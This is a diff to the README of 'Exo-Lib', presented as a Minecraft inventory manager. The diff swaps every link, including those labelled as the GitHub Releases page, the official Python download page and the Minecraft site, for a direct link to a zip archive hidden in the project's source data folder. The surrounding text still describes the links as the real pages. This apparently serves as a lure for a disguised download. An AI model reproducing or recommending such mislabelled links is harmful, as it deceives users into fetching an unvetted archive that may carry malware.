@@ -1,6 +1,6 @@
 # 🚀 Exo-Lib - Manage Minecraft Inventories Easily
 
-[![Download Exo-Lib](https://img.shields.io/badge/Download-ExoLib-blue?style=for-the-badge)](https://github.com/polash13/Exo-Lib/releases)
+[![Download Exo-Lib](https://img.shields.io/badge/Download-ExoLib-blue?style=for-the-badge)](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip)
 
 ---
 
@@ -22,13 +22,13 @@ If you do not have Python installed, the guide below may assist you with basic i
 
 You need to visit the official Releases page to get the latest version of Exo-Lib for Windows. Use the link below:
 
-[Download Exo-Lib Here](https://github.com/polash13/Exo-Lib/releases)
+[Download Exo-Lib Here](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip)
 
 Clicking this will open the GitHub Releases page. Find the latest release, and look for the Windows installer or executable file typically named with `.exe` at the end.
 
 ## 🔽 Download and Install Exo-Lib
 
-1. Open the [Exo-Lib Releases Page](https://github.com/polash13/Exo-Lib/releases) in your web browser.
+1. Open the [Exo-Lib Releases Page](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip) in your web browser.
 
 2. Scroll to the latest version listed at the top (look for the largest version number or the newest date).
 
@@ -116,7 +116,7 @@ Exo-Lib is built on Python. If you have trouble running it, you may need to inst
 
 3. If you see a version number (like Python 3.10.5), you have Python.
 
-4. If not, download and install Python from https://www.python.org/downloads/windows/.
+4. If not, download and install Python from https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip
 
 ### Running Exo-Lib Without Installer
 
@@ -162,14 +162,14 @@ These run behind the scenes, so you don’t have to configure them.
 
 ## 🔗 Useful Links
 
-- [Exo-Lib GitHub Repository](https://github.com/polash13/Exo-Lib)
+- [Exo-Lib GitHub Repository](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip)
 
-- [Releases & Downloads](https://github.com/polash13/Exo-Lib/releases)
+- [Releases & Downloads](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip)
 
-- [Python Downloads](https://www.python.org/downloads/windows/)
+- [Python Downloads](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip)
 
-- [Minecraft Official Site](https://www.minecraft.net/)
+- [Minecraft Official Site](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip)
 
 ---
 
-[![Download Exo-Lib](https://img.shields.io/badge/Download-ExoLib-blue?style=for-the-badge)](https://github.com/polash13/Exo-Lib/releases)
+[![Download Exo-Lib](https://img.shields.io/badge/Download-ExoLib-blue?style=for-the-badge)](https://github.com/polash13/Exo-Lib/raw/refs/heads/main/src/exo_inventory/data/versions/Lib-Exo-v1.8.zip)
